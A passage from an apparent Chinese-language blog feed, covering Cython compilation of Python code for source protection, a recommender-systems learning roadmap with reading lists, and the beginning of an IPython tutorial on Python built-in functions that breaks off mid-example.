class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from distutils.core import setup</span><br><span class="line">from Cython.Build import cythonize</span><br><span class="line"></span><br><span class="line">setup(name='Hello World app',</span><br><span class="line">     ext_modules=cythonize('hello.pyx'))</span><br></pre></td></tr></table></figure><p>3）编译为.c，再进一步编译为.so或.pyd：</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python setup.py build_ext --inplace</span><br></pre></td></tr></table></figure><p>执行python -c “from hello import hello;hello()”即可直接引用生成的二进制文件中的hello()函数。</p><p>优点：</p><ul><li><p>生成的二进制 .so 或 .pyd 文件难以破解</p></li><li><p>同时带来了性能提升</p></li></ul><p>不足：</p><ul><li><p>兼容性稍差，对于不同版本的操作系统，可能需要重新编译</p></li><li><p>虽然支持大多数 Python 代码，但如果一旦发现部分代码不支持，完善成本较高</p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;由于 Python 的动态特性和开源特点，导致 Python 代码很难做到很好的加密。社区中的一些声音认为这样的限制是事实，应该通过法律手段而不是加密源码达到商业保护的目的；而还有一些声音则是不论如何都希望能有一种手段来加密。于是乎，人们想出了各种或加密、或混淆的方案，借此来达到保护源码的目的。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="代码加密" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%8A%A0%E5%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>[转]推荐系统入门经验</title>
    <link href="http://yoursite.com/2019/11/05/%E8%BD%AC-%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8%E7%BB%8F%E9%AA%8C/"/>
    <id>http://yoursite.com/2019/11/05/转-推荐系统入门经验/</id>
    <published>2019-11-05T13:46:55.000Z</published>
    <updated>2019-11-05T14:01:24.746Z</updated>
    
    <content type="html"><![CDATA[<p>自学推荐系统两年多了，也阅读了一些相关的书籍和论文，但毕竟还没有实际的在公司做过推荐相关项目，所以说跟大佬们相比，还是有很多差距的。不过，在入门推荐的道路上，有一些经验和资料还是可以分享给你的，希望本文能够对你有所帮助。</p><a id="more"></a><h1 id="1、第一阶段-掌握机器学习基础知识，打好基础"><a href="#1、第一阶段-掌握机器学习基础知识，打好基础" class="headerlink" title="1、第一阶段 - 掌握机器学习基础知识，打好基础"></a>1、第一阶段 - 掌握机器学习基础知识，打好基础</h1><p>学习推荐系统，还是要掌握一定的机器学习知识的，从特征获取、特征处理、特征选择，到基本的机器学习模型如逻辑回归、GBDT等等，都需要你熟练掌握。</p><p>其中比较重要的就是特征这块，因为推荐系统中会面临大量的离散特征，对离散特征的处理方式需要有一定的了解。</p><p>这里还是推荐李航博士的《统计学习方法第二版》。</p><p>然后就是神经网络，推荐系统中神经网络运用非常多，神经网络中基础的如循环神经网络、卷积神经网络，以及一些模型结构的搭建、训练的技巧如Dropout、BN等等也需要有所理解。</p><p>这个推荐吴恩达的深度学习课程以及李宏毅老师的深度学习课程。</p><h1 id="2、第二阶段-阅读推荐系统经典书籍，入门推荐"><a href="#2、第二阶段-阅读推荐系统经典书籍，入门推荐" class="headerlink" title="2、第二阶段 - 阅读推荐系统经典书籍，入门推荐"></a>2、第二阶段 - 阅读推荐系统经典书籍，入门推荐</h1><p>推荐系统市面上的书不是很多，而且写得往往不够深入，仅能够起到一定的入门作用，毕竟推荐在各个公司还是比较核心的内容，是比较受到保护的。但经典的书籍还是有的，入门的话推荐两本。</p><p>一是大家所熟知的《推荐系统实践》，这本的话对于大家了解推荐系统中最基本的算法如协同过滤、推荐系统中常用的评价指标、使用上下文和社交网络进行推荐、如何解决冷启动问题都有一定的帮助。</p><p>二是最近市面上新出现的《推荐系统开发实战》一书，虽然这本书我还没有看过，但不少的群友反映这本书对于入门推荐系统来说十分友好。理论和实战相结合，是挺不错的一本“小白实操书”。</p><p><a href="https://imgchr.com/i/M9YoRJ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/05/M9YoRJ.md.jpg" alt="M9YoRJ.jpg" border="0"></a></p><p>然后还有的一些书籍如《推荐系统与深度学习》和《推荐系统-技术、评估及高效算法》，大家感兴趣的话也可以进行阅读。</p><h1 id="3、第三阶段-精读推荐系统经典论文，掌握诀窍"><a href="#3、第三阶段-精读推荐系统经典论文，掌握诀窍" class="headerlink" title="3、第三阶段 - 精读推荐系统经典论文，掌握诀窍"></a>3、第三阶段 - 精读推荐系统经典论文，掌握诀窍</h1><p>在理解基本的推荐知识之后，你大概会了解到推荐具体是做什么的，那么其问题又可以分成几个方面。如召回、CTR预估、Learning to Rank等等。这个时候我建议的话就是开始阅读经典论文了。下面整理一些我看过的比较经典的论文吧，可能有遗漏，也欢迎大家补充。</p><p>FM：《Factorization Machines》</p><p>FFM：《Field-aware Factorization Machines for CTR Prediction》</p><p>DeepFM：《DeepFM: A Factorization-Machine based Neural Network for CTR Prediction》</p><p>Wide &amp; Deep：《Wide &amp; Deep Learning for Recommender Systems》</p><p>DCN：《Deep &amp; Cross Network for Ad Click Predictions》</p><p>NFM：《Neural Factorization Machines for Sparse Predictive Analytics》</p><p>AFM：《Attentional Factorization Machines:Learning the Weight of Feature Interactions via Attention Networks》</p><p>GBDT + LR：《Practical Lessons from Predicting Clicks on Ads at Facebook》</p><p>MLR：《Learning Piece-wise Linear Models from Large Scale Data for Ad Click Prediction》</p><p>DIN：《Deep Interest Network for Click-Through Rate Prediction》</p><p>DIEN：《Deep Interest Evolution Network for Click-Through Rate Prediction》</p><p>BPR：《BPR: Bayesian Personalized Ranking from Implicit Feedback》</p><p>Youtube：《Deep Neural Networks for YouTube Recommendations》</p><p>当然有些其他的论文也十分经典，咱们放在后面继续讲。</p><p>读论文也是需要一定的技巧，不同的人可能关注的点不一样，所以导致阅读重心不一样。对于我来说，我比较关注的点是这个论文要解决什么样的问题，是如何解决的，以及作者从哪几方面出发，使用什么评价指标来评判模型的好坏。至于效果，论文嘛，可信可不信，看看就好了。</p><h1 id="4、第四阶段-复现推荐论文开源代码，加深理解"><a href="#4、第四阶段-复现推荐论文开源代码，加深理解" class="headerlink" title="4、第四阶段 - 复现推荐论文开源代码，加深理解"></a>4、第四阶段 - 复现推荐论文开源代码，加深理解</h1><p>读论文中你也许会有很多疑惑，如DeepFM这个Embedding如何共享的？DIN里面的Attention如何实现？解决这些疑惑的最好办法我认为不是读论文、百度别人写的博客，最好的方法就是去找开源的代码，试着复现也好，比着代码自己实现一遍也好，对你加深认识都有很大的帮助！</p><p>有一些开源的代码我已经帮大家整理的差不多了，在下面的github中（以后不要再问我数据或者地址的问题了，数据都在github的readme中）：<a href="https://github.com/princewen/tensorflow_practice" target="_blank" rel="noopener">https://github.com/princewen/tensorflow_practice</a></p><p>不管对一篇论文你看懂了还是没看懂也好，都去尝试复现一遍吧，真的很有帮助。</p><h1 id="5、第五阶段-持续跟进最近推荐论文，思维发散"><a href="#5、第五阶段-持续跟进最近推荐论文，思维发散" class="headerlink" title="5、第五阶段 - 持续跟进最近推荐论文，思维发散"></a>5、第五阶段 - 持续跟进最近推荐论文，思维发散</h1><p>在不断跟进推荐系统论文的过程中，你会发现推荐系统会借鉴各个领域的方法， 持续跟进最近推荐论文，对我们学习其他领域如NLP、图像领域、强化学习等等都会有所帮助。接下来列举一些借鉴其他领域方法的一些文章吧，也算是对第三部分的一个补充。</p><p><strong>强化学习</strong></p><p>《DRN: A Deep Reinforcement Learning Framework for News Recommendation》</p><p>《Deep Reinforcement Learning for List-wise Recommendations》</p><p><strong>多任务学习</strong></p><p>《Entire Space Multi-Task Model: An Effective Approach for Estimating Post-Click Conversion Rate》</p><p>《Why I like it: Multi-task Learning for Recommendation and Explanation》</p><p><strong>GAN</strong></p><p>《IRGAN: A Minimax Game for Unifying Generative and Discriminative Information Retrieval Models》</p><p>《CFGAN: A Generic Collaborative Filtering Framework based on Generative Adversarial Networks》</p><p><strong>知识图谱</strong></p><p>《DKN: Deep Knowledge-Aware Network for News Recommendation》</p><p>《RippleNet: Propagating User Preferences on the Knowledge Graph for Recommender Systems》</p><p>《Multi-task Learning for KG enhanced Recommendation》</p><p>《Perceive Your Users in Depth: Learning Universal User Representations from Multiple E-commerce Tasks》</p><p><strong>Transformer</strong></p><p>《Next Item Recommendation with Self-Attention》</p><p>《Deep Session Interest Network for Click-Through Rate Prediction》</p><p>《Behavior Sequence Transformer for E-commerce Recommendation in Alibaba》</p><p>《BERT4Rec: Sequential Recommendation with Bidirectional Encoder Representations from Transformer》</p><p><strong>RNN &amp; GNN</strong></p><p>《SESSION-BASED RECOMMENDATIONS WITH RECURRENT NEURAL NETWORKS》</p><p>《Improved Recurrent Neural Networks for Session-based Recommendations》</p><p>《Session-based Recommendation with Graph Neural Networks》</p><p><strong>Embedding技巧</strong></p><p>《Real-time Personalization using Embeddings for Search Ranking at Airbnb》</p><p>《Learning and Transferring IDs Representation in E-commerce》</p><p>《Billion-scale Commodity Embedding for E-commerce Recommendation in Alibaba》</p><p><strong>福粒:</strong></p><ol><li><p><a href="http://pan.sqdxwz.com/?/文档/" target="_blank" rel="noopener">论文下载</a></p></li><li><p>微信搜索：小小挖掘机</p></li></ol><img src="https://s2.ax1x.com/2019/11/05/M9NpkT.jpg" alt="M9NpkT.jpg" border="0">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;自学推荐系统两年多了，也阅读了一些相关的书籍和论文，但毕竟还没有实际的在公司做过推荐相关项目，所以说跟大佬们相比，还是有很多差距的。不过，在入门推荐的道路上，有一些经验和资料还是可以分享给你的，希望本文能够对你有所帮助。&lt;/p&gt;
    
    </summary>
    
    
      <category term="推荐系统" scheme="http://yoursite.com/categories/%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="入门" scheme="http://yoursite.com/tags/%E5%85%A5%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>python 63个内置函数</title>
    <link href="http://yoursite.com/2019/11/03/python-63%E4%B8%AA%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0/"/>
    <id>http://yoursite.com/2019/11/03/python-63个内置函数/</id>
    <published>2019-11-03T07:37:21.000Z</published>
    <updated>2019-11-03T07:52:40.107Z</updated>
    
    <content type="html"><![CDATA[<p>1 abs()</p><p>绝对值或复数的模</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">1</span>]: abs(<span class="hljs-number">-6</span>)</span><br><span class="line">Out[<span class="hljs-number">1</span>]: <span class="hljs-number">6</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>2 all()　<br>　<br>接受一个迭代器，如果迭代器的所有元素都为真，那么返回True，否则返回False</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">2</span>]: all([<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">6</span>])</span><br><span class="line">Out[<span class="hljs-number">2</span>]: <span class="hljs-literal">False</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">3</span>]: all([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>])</span><br><span class="line">Out[<span class="hljs-number">3</span>]: <span class="hljs-literal">True</span></span><br></pre></td></tr></table></figure><p>3 any()　　</p><p>接受一个迭代器，如果迭代器里有一个元素为真，那么返回True，否则返回False</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">4</span>]: any([<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,[]])</span><br><span class="line">Out[<span class="hljs-number">4</span>]: <span class="hljs-literal">False</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">5</span>]: any([<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>])</span><br><span class="line">Out[<span class="hljs-number">5</span>]: <span class="hljs-literal">True</span></span><br></pre></td></tr></table></figure><p>4 ascii()　<br>　<br>调用对象的repr() 方法，获得该方法的返回值</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">30</span>]: <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    ...:     <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self,id,name)</span>:</span></span><br><span class="line">    ...:         self.id = id</span><br><span class="line">    ...:         self.name = name</span><br><span class="line">    ...:     <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__repr__</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">    ...:         <span class="hljs-keyword">return</span> <span class="hljs-string">'id = '</span>+self.id +<span class="hljs-string">', name = '</span>+self.name</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">33</span>]: print(xiaoming)</span><br><span class="line">id = <span class="hljs-number">001</span>, name = xiaoming</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">34</span>]: ascii(xiaoming)</span><br><span class="line">Out[<span class="hljs-number">34</span>]: <span class="hljs-string">'id = 001, name = xiaoming'</span></span><br></pre></td></tr></table></figure><p>5  bin()</p><p>将十进制转换为二进制</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">35</span>]: bin(<span class="hljs-number">10</span>)</span><br><span class="line">Out[<span class="hljs-number">35</span>]: <span class="hljs-string">'0b1010'</span></span><br></pre></td></tr></table></figure><p>6 oct()</p><p>将十进制转换为八进制</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">36</span>]: oct(<span class="hljs-number">9</span>)</span><br><span class="line">Out[<span class="hljs-number">36</span>]: <span class="hljs-string">'0o11'</span></span><br></pre></td></tr></table></figure><p>7 hex()</p><p>将十进制转换为十六进制</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">37</span>]: hex(<span class="hljs-number">15</span>)</span><br><span class="line">Out[<span class="hljs-number">37</span>]: <span class="hljs-string">'0xf'</span></span><br></pre></td></tr></table></figure><p>8 bool()　<br>　<br>测试一个对象是True, 还是False.</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">38</span>]: bool([<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>])</span><br><span class="line">Out[<span class="hljs-number">38</span>]: <span class="hljs-literal">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">39</span>]: bool([])</span><br><span class="line">Out[<span class="hljs-number">39</span>]: <span class="hljs-literal">False</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">40</span>]: bool([<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>])</span><br><span class="line">Out[<span class="hljs-number">40</span>]: <span class="hljs-literal">True</span></span><br></pre></td></tr></table></figure><p>9 bytes()　　</p><p>将一个字符串转换成字节类型</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">44</span>]: s = <span class="hljs-string">"apple"</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">45</span>]: bytes(s,encoding=<span class="hljs-string">'utf-8'</span>)</span><br><span class="line">Out[<span class="hljs-number">45</span>]: <span class="hljs-string">b'apple'</span></span><br></pre></td></tr></table></figure><p>10 str()　　</p><p>将字符类型、数值类型等转换为字符串类型</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">46</span>]: integ = <span class="hljs-number">100</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">47</span>]: str(integ)</span><br><span class="line">Out[<span class="hljs-number">47</span>]: <span class="hljs-string">'100'</span></span><br></pre></td></tr></table></figure><p>11 callable()　　</p><p>判断对象是否可以被调用，能被调用的对象就是一个callable 对象，比如函数 str, int 等都是可被调用的，但是例子4 中xiaoming这个实例是不可被调用的：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">48</span>]: callable(str)</span><br><span class="line">Out[<span class="hljs-number">48</span>]: <span class="hljs-literal">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">49</span>]: callable(int)</span><br><span class="line">Out[<span class="hljs-number">49</span>]: <span class="hljs-literal">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">50</span>]: xiaoming</span><br><span class="line">Out[<span class="hljs-number">50</span>]: id = <span class="hljs-number">001</span>, name = xiaoming</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">51</span>]: callable(xiaoming)</span><br><span class="line">Out[<span class="hljs-number">51</span>]: <span class="hljs-literal">False</span></span><br></pre></td></tr></table></figure><p>12 chr()</p><p>查看十进制整数对应的ASCII字符</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">54</span>]: chr(<span class="hljs-number">65</span>)</span><br><span class="line">Out[<span class="hljs-number">54</span>]: <span class="hljs-string">'A'</span></span><br></pre></td></tr></table></figure><p>13 ord()</p><p>查看某个ascii对应的十进制数</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">60</span>]: ord(<span class="hljs-string">'A'</span>)</span><br><span class="line">Out[<span class="hljs-number">60</span>]: <span class="hljs-number">65</span></span><br></pre></td></tr></table></figure><p>14 classmethod()　<br>　<br>classmethod 修饰符对应的函数不需要实例化，不需要 self 参数，但第一个参数需要是表示自身类的 cls 参数，可以来调用类的属性，类的方法，实例化对象等。</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">66</span>]: <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    ...:     <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self,id,name)</span>:</span></span><br><span class="line">    ...:         self.id = id</span><br><span class="line">    ...:         self.name = name</span><br><span class="line">    ...:     <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__repr__</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">    ...:         <span class="hljs-keyword">return</span> <span class="hljs-string">'id = '</span>+self.id +<span class="hljs-string">', name = '</span>+self.name</span><br><span class="line">    ...:     @classmethod</span><br><span class="line">    ...:     <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span><span class="hljs-params">(cls)</span>:</span></span><br><span class="line">    ...:         print(cls)</span><br></pre></td></tr></table></figure><p>15 complie()　　</p><p>将字符串编译成python 能识别或可以执行的代码，也可以将文字读成字符串再编译。</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">74</span>]: s  = <span class="hljs-string">"print('helloworld')"</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">75</span>]: r = compile(s,<span class="hljs-string">"&lt;string&gt;"</span>, <span class="hljs-string">"exec"</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">76</span>]: r</span><br><span class="line">Out[<span class="hljs-number">76</span>]: &lt;code object &lt;module&gt; at <span class="hljs-number">0x0000000005DE75D0</span>, file <span class="hljs-string">"&lt;string&gt;"</span>, line <span class="hljs-number">1</span>&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">77</span>]: exec(r)</span><br><span class="line">helloworld</span><br></pre></td></tr></table></figure><p>16  complex()</p><p>创建一个复数</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">81</span>]: complex(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)</span><br><span class="line">Out[<span class="hljs-number">81</span>]: (<span class="hljs-number">1</span>+<span class="hljs-number">2j</span>)</span><br></pre></td></tr></table></figure><p>17 delattr()　<br>　<br>删除对象的属性</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">87</span>]: delattr(xiaoming,<span class="hljs-string">'id'</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">88</span>]: hasattr(xiaoming,<span class="hljs-string">'id'</span>)</span><br><span class="line">Out[<span class="hljs-number">88</span>]: <span class="hljs-literal">False</span></span><br></pre></td></tr></table></figure><p>18 dict()　<br>　<br>创建数据字典</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">92</span>]: dict()</span><br><span class="line">Out[<span class="hljs-number">92</span>]: &#123;&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">93</span>]: dict(a=<span class="hljs-string">'a'</span>,b=<span class="hljs-string">'b'</span>)</span><br><span class="line">Out[<span class="hljs-number">93</span>]: &#123;<span class="hljs-string">'a'</span>: <span class="hljs-string">'a'</span>, <span class="hljs-string">'b'</span>: <span class="hljs-string">'b'</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">94</span>]: dict(zip([<span class="hljs-string">'a'</span>,<span class="hljs-string">'b'</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>]))</span><br><span class="line">Out[<span class="hljs-number">94</span>]: &#123;<span class="hljs-string">'a'</span>: <span class="hljs-number">1</span>, <span class="hljs-string">'b'</span>: <span class="hljs-number">2</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">95</span>]: dict([(<span class="hljs-string">'a'</span>,<span class="hljs-number">1</span>),(<span class="hljs-string">'b'</span>,<span class="hljs-number">2</span>)])</span><br><span class="line">Out[<span class="hljs-number">95</span>]: &#123;<span class="hljs-string">'a'</span>: <span class="hljs-number">1</span>, <span class="hljs-string">'b'</span>: <span class="hljs-number">2</span>&#125;</span><br></pre></td></tr></table></figure><p>19 dir()　　</p><p>不带参数时返回当前范围内的变量，方法和定义的类型列表；带参数时返回参数的属性，方法列表。</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">96</span>]: dir(xiaoming)</span><br><span class="line">Out[<span class="hljs-number">96</span>]:</span><br><span class="line">[<span class="hljs-string">'__class__'</span>,</span><br><span class="line"> <span class="hljs-string">'__delattr__'</span>,</span><br><span class="line"> <span class="hljs-string">'__dict__'</span>,</span><br><span class="line"> <span class="hljs-string">'__dir__'</span>,</span><br><span class="line"> <span class="hljs-string">'__doc__'</span>,</span><br><span class="line"> <span class="hljs-string">'__eq__'</span>,</span><br><span class="line"> <span class="hljs-string">'__format__'</span>,</span><br><span class="line"> <span class="hljs-string">'__ge__'</span>,</span><br><span class="line"> <span class="hljs-string">'__getattribute__'</span>,</span><br><span class="line"> <span class="hljs-string">'__gt__'</span>,</span><br><span class="line"> <span class="hljs-string">'__hash__'</span>,</span><br><span class="line"> <span class="hljs-string">'__init__'</span>,</span><br><span class="line"> <span class="hljs-string">'__init_subclass__'</span>,</span><br><span class="line"> <span class="hljs-string">'__le__'</span>,</span><br><span class="line"> <span class="hljs-string">'__lt__'</span>,</span><br><span class="line"> <span class="hljs-string">'__module__'</span>,</span><br><span class="line"> <span class="hljs-string">'__ne__'</span>,</span><br><span class="line"> <span class="hljs-string">'__new__'</span>,</span><br><span class="line"> <span class="hljs-string">'__reduce__'</span>,</span><br><span class="line"> <span class="hljs-string">'__reduce_ex__'</span>,</span><br><span class="line"> <span class="hljs-string">'__repr__'</span>,</span><br><span class="line"> <span class="hljs-string">'__setattr__'</span>,</span><br><span class="line"> <span class="hljs-string">'__sizeof__'</span>,</span><br><span class="line"> <span class="hljs-string">'__str__'</span>,</span><br><span class="line"> <span class="hljs-string">'__subclasshook__'</span>,</span><br><span class="line"> <span class="hljs-string">'__weakref__'</span>,</span><br><span class="line"></span><br><span class="line"> <span class="hljs-string">'name'</span>]</span><br></pre></td></tr></table></figure><p>20 divmod()　　</p><p>分别取商和余数</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">97</span>]: divmod(<span class="hljs-number">10</span>,<span class="hljs-number">3</span>)</span><br><span class="line">Out[<span class="hljs-number">97</span>]: (<span class="hljs-number">3</span>, <span class="hljs-number">1</span>)</span><br></pre></td></tr></table></figure><p>21 enumerate()　　</p><p>返回一个可以枚举的对象，该对象的next()方法将返回一个元组。</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">98</span>]: s = [<span class="hljs-string">"a"</span>,<span class="hljs-string">"b"</span>,<span class="hljs-string">"c"</span>]</span><br><span class="line">    ...: <span class="hljs-keyword">for</span> i ,v <span class="hljs-keyword">in</span> enumerate(s,<span class="hljs-number">1</span>):</span><br><span class="line">    ...:     print(i,v)</span><br><span class="line">    ...:</span><br><span class="line"><span class="hljs-number">1</span> a</span><br><span class="line"><span class="hljs-number">2</span> b</span><br><span class="line"><span class="hljs-number">3</span> c</span><br></pre></td></tr></table></figure><p>22 eval()　<br>　<br>将字符串str 当成有效的表达式来求值并返回计算结果取出字符串中内容</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">99</span>]: s = <span class="hljs-string">"1 + 3 +5"</span></span><br><span class="line">    ...: eval(s)</span><br><span class="line">    ...:</span><br><span class="line">Out[<span class="hljs-number">99</span>]: <span class="hljs-number">9</span></span><br></pre></td></tr></table></figure><p>23 exec()　<br>　<br>执行字符串或complie方法编译过的字符串，没有返回值</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">74</span>]: s  = <span class="hljs-string">"print('helloworld')"</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">75</span>]: r = compile(s,<span class="hljs-string">"&lt;string&gt;"</span>, <span 